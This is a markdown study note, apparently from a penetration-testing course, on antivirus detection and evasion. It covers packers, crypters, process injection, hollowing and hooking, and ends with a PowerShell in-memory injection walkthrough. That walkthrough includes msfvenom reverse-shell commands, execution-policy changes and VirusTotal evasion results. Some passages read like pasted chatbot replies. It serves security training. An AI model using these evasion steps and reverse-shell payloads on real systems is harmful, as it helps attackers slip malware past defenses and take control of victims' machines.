# Content

- [Content](#content)
  - [What is Antivirus Software](#what-is-antivirus-software)
  - [Methods of Detecting Malicious Code](#methods-of-detecting-malicious-code)
    - [Detection Methods](#detection-methods)
  - [Bypassing Antivirus Detection](#bypassing-antivirus-detection)
    - [On-Disk Evasion](#on-disk-evasion)
      - [Packers](#packers)
      - [Obfuscators](#obfuscators)
      - [Crypters](#crypters)
      - [Software Protectors](#software-protectors)
    - [In-Memory Evasion](#in-memory-evasion)
      - [Remote Process Memory Injection](#remote-process-memory-injection)
      - [Reflective DLL Injection](#reflective-dll-injection)
      - [Process Hollowing](#process-hollowing)
      - [Inline hooking](#inline-hooking)
    - [AV Evasion: Practical Example](#av-evasion-practical-example)
      - [PowerShell In-Memory Injection](#powershell-in-memory-injection)

  
## What is Antivirus Software

- Antivirus (AV) is type of application designed to prevent, detect, and remove malicious 
software.
- It was originally designed to simply remove computer viruses. However, with the 
development of other types of malware, antivirus software now typically includes additional 
protections such as firewalls, website scanners, and more

## Methods of Detecting Malicious Code

- In order to demonstrate the effectiveness of various antivirus products, we will start by scanning a popular Meterpreter payload. 
- Using msfvenom, we will generate a standard Portable Executable file containing our payload, in this case a simple TCP reverse shell.
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.156 LPORT=4444 -f exe > binary.exe
  ```
  ![Picture](../17.%20Antivirus%20Evasion/Image/1.png)
- Next we will use the VirusTotal website to scan our binary. VirusTotal is a free online service that analyzes files and URLs for viruses, worms, trojans, and other kinds of malicious content.
  ![Picture](../17.%20Antivirus%20Evasion/Image/2.png)

### Detection Methods

- Anti-virus detection methods, but focus on two main methods: signature-based detection and heuristic-based detection.
  - Signature-based detection is a method of detecting malicious code by scanning the file system for signatures of known malware. When any signature is detected, dangerous files will be quarantined or processed. 
  - However, the passage also mentions how easy it is to bypass this signature-based antivirus by altering or masking the contents of a known malicious file.
- To overcome the disadvantage of signature-based detection, antivirus manufacturers have introduced additional detection methods such as heuristic-based detection and behavior-based detection.
  - Heuristic-based detection is a detection method based on rules and algorithms to determine if an action is considered malicious. This is usually done by traversing the script of a binary file or attempting to decode and parse the source code. The idea is to look for patterns and program calls (rather than just relying on simple sequences of bytes) that are considered malicious.
  - Behavior-based detection is a method of detection through dynamic analysis of the behavior of a binary file. Usually, this is done by executing the file in a simulated environment such as a small virtual machine and looking for behaviors or actions that are considered malicious.

## Bypassing Antivirus Detection
### On-Disk Evasion

- To begin our discussion of evasion, we will first look at various techniques used to obfuscate files stored on a physical disk.

#### Packers

- In modern on-disk malware obfuscation, there are various techniques employed. One of the earliest methods used to evade detection was through the use of packers. 
- During the early days of the Internet, where disk space was costly and network speeds were slow, packers were primarily designed to reduce the size of executable files. Unlike modern compression techniques like "zip," packers not only shrink the file size but also create a functionally equivalent executable with a completely different binary structure. 
- This results in a new signature for the file, allowing it to effectively bypass older and simpler antivirus (AV) scanners. 
- However, it's important to note that although some modern malware still utilizes variations of this technique, relying solely on popular packers like UPX is insufficient to evade modern AV scanners.

#### Obfuscators

- Obfuscators reorganize and mutate code in a way that makes it more difficult to reverse-engineer. 
- This includes replacing instructions with semantically equivalent ones, inserting 
irrelevant instructions or “dead code”,412 splitting or reordering functions, and so on.
- Although primarily used by software developers to protect their intellectual property, this technique is also marginally effective against signature-based AV detection.

#### Crypters

- “Crypter” software cryptographically alters executable code, adding a decrypting stub that 
restores the original code upon execution. 
- This decryption happens in-memory, leaving only the encrypted code on-disk. 
- Encryption has become foundational in modern malware as one of the most effective AV evasion techniques.

#### Software Protectors

- Highly effective antivirus evasion requires a combination of all of the previous techniques in 
addition to other advanced ones, including anti-reversing, anti-debugging, virtual machine 
emulation detection, and so on. In most cases, software protectors were designed for legitimate 
purposes but can also be used to bypass AV detection.
- Most of these techniques may appear simple at a high-level but they are actually quite complex. Because of this, there are currently few actively-maintained free tools that provide acceptable antivirus evasion. 
- Among commercially available tools, The Enigma Protector in particular can successfully be used to bypass antivirus products.

### In-Memory Evasion

- In-Memory Injections,also known as PE Injection is a popular technique used to bypass 
antivirus products. Rather than obfuscating a malicious binary, creating new sections, or 
changing existing permissions, this technique instead focuses on the manipulation of volatile 
memory. 
- One of the main benefits of this technique is that it does not write any files to disk, 
which is one the main areas of focus for most antivirus products.
- There are several evasion techniques that do not write files to disk. 

#### Remote Process Memory Injection

- The technique described here is known as process injection, specifically injecting a payload into another valid PE (Portable Executable) file in a way that appears non-malicious. The most common approach involves utilizing Windows APIs.
- Let's break down the steps involved.
  - Obtain a valid handle to the target process: The first step is to use the OpenProcess function, which allows us to acquire a valid handle (HANDLE) to a target process that we have the necessary permissions to access.
  - Allocate memory in the target process: Once we have the handle to the target process, we can allocate memory within that process by invoking a Windows API like VirtualAllocEx. This allows us to reserve memory space where we can write our payload.
  - Copy the payload into the allocated memory: After successfully allocating memory in the remote process, we utilize the WriteProcessMemory function to copy our malicious payload into the newly allocated memory space. This function enables us to write data from our local process into the targeted process.
  - Execute the payload in the remote process: Once the payload has been copied into the target process, it can be executed in memory. One common method is to create a separate thread within the remote process using the CreateRemoteThread API. This thread will execute our injected payload.
- Although the process may initially sound complex, you can achieve a similar technique using PowerShell, simplifying the attack and targeting a local instance of powershell.exe.

#### Reflective DLL Injection

-  The technique being described here is different from regular DLL injection. In traditional DLL injection, a malicious DLL file is loaded from the disk into the target process using the LoadLibrary API. However, in this technique, the attacker aims to load a DLL that is stored in the process memory itself.
- The main challenge with this technique is that the LoadLibrary function does not support loading a DLL from memory. Additionally, the Windows operating system does not provide any built-in APIs to handle this scenario. Therefore, attackers who wish to use this technique must create their own custom version of the API that can load a DLL directly from memory without relying on a DLL file stored on disk.
- In summary, this technique involves loading a DLL from the process memory instead of from a file on disk. Attackers need to overcome the limitations of existing APIs like LoadLibrary by creating their own custom version of the API to achieve this.

#### Process Hollowing

- The technique you're referring to is known as process hollowing. It is used by attackers to bypass antivirus software by executing malicious code within a legitimate process. Here's how the process hollowing technique works.
  - Launch a non-malicious process in a suspended state: The attacker starts by launching a benign or non-malicious process, typically one that is less likely to raise suspicion or trigger security measures. This process is created in a suspended state, meaning it remains inactive and does not execute any code.
  - Replace the process image with a malicious executable: Once the benign process is launched and suspended, the attacker removes the original executable image from the process's memory space. Instead, they inject a malicious executable image into the same memory space. This malicious executable contains the code they want to execute.
  - Resume the process to execute the malicious code: After replacing the process's image with the malicious executable, the attacker resumes the previously suspended process. As a result, instead of executing the legitimate code of the original process, the process now executes the malicious code injected by the attacker.
- By utilizing process hollowing, attackers can effectively disguise their malicious activities within a legitimate process. This can help them evade detection by antivirus software and other security mechanisms that may be more focused on identifying suspicious or malicious standalone executables.

#### Inline hooking

- The technique you're referring to is called code hooking. It involves modifying the memory of a program and introducing a hook, which redirects the execution flow to execute custom malicious code. Here's a summary of how code hooking works.
  - Modifying memory: In this technique, the attacker modifies the memory of the target program. They identify a specific function within the program where they want to introduce their malicious code.
  - Introducing a hook: The attacker inserts instructions in the targeted function that redirect the normal execution flow to their malicious code. This hook acts as a detour, diverting the program's execution to the attacker's code instead.
  - Executing malicious code: Once the execution flow has been redirected to the hook, the attacker's malicious code is executed. This code can perform various actions, such as stealing sensitive information, modifying data, or launching additional attacks.
  - Returning to the modified function: After executing the malicious code, the flow returns back to the original function, making it appear as if only the legitimate code had executed. This helps the attacker maintain stealth and avoid detection.
- Code hooking allows attackers to intercept and manipulate the behavior of a program without modifying its original source code. By injecting hooks into specific functions, they can control the execution flow and carry out malicious activities while maintaining the appearance of normal program behavior.

### AV Evasion: Practical Example
#### PowerShell In-Memory Injection

- The technique you're referring to is known as PowerShell injection. It involves injecting malicious PowerShell code into a legitimate process. Here's a summary of how PowerShell injection works.
  - Launch a non-malicious process in a suspended state: The attacker starts by launching a benign or non-malicious process, typically one that is less likely to raise suspicion or trigger security measures. This process is created in a suspended state, meaning it remains inactive and does not execute any code.
  - Inject malicious PowerShell code into the process: Once the benign process is launched and suspended, the attacker injects malicious PowerShell code into the process's memory space. This code contains the instructions they want to execute.
  - Resume the process to execute the malicious code: After injecting the malicious code, the attacker resumes the previously suspended process. As a result, instead of executing the legitimate code of the original process, the process now executes the malicious PowerShell code injected by the attacker.
- We have a basic template script that performs in-memory injection.
  ![Picture](../17.%20Antivirus%20Evasion/Image/3.png)
  - The script starts by importing VirtualAlloc and CreateThread from kernel32.dll as well as 
  memset from msvcrt.dll. These functions will allow us to allocate memory, create an execution 
  thread, and write arbitrary data to the allocated memory, respectively. Once again, notice that we are allocating the memory and executing a new thread in the current process (powershell.exe), rather than a remote one.
  ![Picture](../17.%20Antivirus%20Evasion/Image/4.png)
  - The script then allocates a block of memory using VirtualAlloc, takes each byte of the payload stored in the $sc byte array, and writes it to our newly allocated memory block using memset.
  ![Picture](../17.%20Antivirus%20Evasion/Image/5.png)
  - As a final step, our in-memory written payload is executed in a separate thread using CreateThread.
  ![Picture](../17.%20Antivirus%20Evasion/Image/6.png)
- Now we begin create a shellcode that will be injected into the powershell.exe process. 
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.50.156 LPORT=4444 -f powershell
  ```
  ![Picture](../17.%20Antivirus%20Evasion/Image/7.png)
- The resulting output can be copied to the final script after renaming the $buf variable from 
msfvenom $sc, as required by the script. Our complete script looks like the following.
  ![Picture](../17.%20Antivirus%20Evasion/Image/8.png)
- According to the results of the VirusTotal scan, less then 50% AV products detected our script. This is quite promising.
  ![Picture](../17.%20Antivirus%20Evasion/Image/9.png)
  ![Picture](../17.%20Antivirus%20Evasion/Image/10.png)
- Now, if we want to run the shellcode in windows, we need to change the execution policy.
  ```bash
  Get-ExecutionPolicy -Scope CurrentUser
  Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
  Get-ExecutionPolicy -Scope CurrentUser
  ```
  ![Picture](../17.%20Antivirus%20Evasion/Image/11.png)
- After that, we use metastrploit to create a listener.
  ![Picture](../17.%20Antivirus%20Evasion/Image/12.png)
  ![Picture](../17.%20Antivirus%20Evasion/Image/13.png)
- Finally, run the script and we can control the windows machine.
  ![Picture](../17.%20Antivirus%20Evasion/Image/14.png)